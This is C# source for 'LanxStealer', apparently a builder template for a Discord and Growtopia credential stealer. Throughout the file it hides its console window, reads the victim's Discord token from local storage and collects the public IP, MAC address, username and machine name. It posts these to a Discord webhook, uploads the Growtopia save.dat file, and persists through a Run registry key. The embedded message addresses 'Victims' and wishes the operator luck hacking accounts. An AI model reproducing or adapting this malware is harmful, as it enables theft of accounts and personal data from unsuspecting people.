using System.Reflection;
using System.Runtime.InteropServices;
using System;
using System.Net;
using System.Collections.Specialized;
using System.IO;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Diagnostics;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.CompilerServices;


[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: AssemblyVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
[assembly: Guid("%Guid%")]

namespace Lanxbuilder
{
	public class LanxStealer : IDisposable
	{

		public string WebHook { get; set; }

		public string Attachment { get; set; }

		public LanxStealer()
		{
			this.dWebClient = new WebClient();
		}

		public void SendMessage(string msgSend)
		{
			LanxStealer.discordValues.Add("content", msgSend);
			this.dWebClient.UploadValues(this.WebHook, LanxStealer.discordValues);
		}

		public void SendAttachment(string path)
		{
			this.dWebClient.UploadFile(this.WebHook, path);
		}

		public void Dispose()
		{
			this.dWebClient.Dispose();
		}

		private readonly WebClient dWebClient;

		private static NameValueCollection discordValues = new NameValueCollection();
	}

	internal class Program
	{
		[DllImport("Kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		[DllImport("User32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);


		public static string GetMACAddress()
		{
			NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
			String sMacAddress = string.Empty;
			foreach (NetworkInterface adapter in nics)
			{
				if (sMacAddress == String.Empty)// only return MAC Address from first card  
				{
					IPInterfaceProperties properties = adapter.GetIPProperties();
					sMacAddress = adapter.GetPhysicalAddress().ToString();
				}
			}
			string macadressgrabber = sMacAddress;
			return macadressgrabber;
		}


		public static string takeToken()
		{
			try
			{
				string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
				int num;
				while ((num = text.IndexOf("oken")) != -1)
				{
					text = text.Substring(num + "oken".Length);
				}
				return text.Split('"')[1];
			}
			catch (Exception)
			{
				return null;
			}
		}


		public static void Startup()
        {
            string dfgdfgdgdg = Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath);
            try
            {
                if (File.Exists(dfgdfgdgdg))
                {
                    File.Delete(dfgdfgdgdg);
                }
                File.Copy(Application.ExecutablePath, Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath));
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                registryKey.SetValue(Path.GetFileNameWithoutExtension(dfgdfgdgdg), dfgdfgdgdg);
            }
            catch
            {
                Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(dfgdfgdgdg));
                if (processesByName.Length > 0)
                {
                    Process[] array = processesByName;
                    int num = 0;
                    if (num < array.Length)
                    {
                        Process process = array[num];
                        process.Kill();
                    }
                }
            }
        }

		private static void Main(string[] args)
		{
			//startuplolhehe
			IntPtr consoleWindow = Program.GetConsoleWindow();
			if (consoleWindow != IntPtr.Zero)
			{
				Program.ShowWindow(consoleWindow, 0);
			}
			WebClient webClient = new WebClient();
			string lanxm = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat";
			string anamz = webClient.DownloadString("http://ipv4bot.whatismyipaddress.com/");
			using (LanxStealer dWebHook = new LanxStealer())
			{
				dWebHook.WebHook = "#webhook";
				dWebHook.SendMessage(string.Concat(new string[]
				{
					"Hello from LanxGT\nVictims ip adress: ",
					anamz,
					"\nVictims Discord token: ",
					takeToken(),
					"\nVictims Mac Adress: ",
					GetMACAddress(),
					"\nVictims username: ",
					Environment.UserName,
					"/",
					Environment.MachineName,
					".\nGoodluck hacking accounts"
				}));
				dWebHook.SendAttachment(lanxm);
			}
		}
	}
}
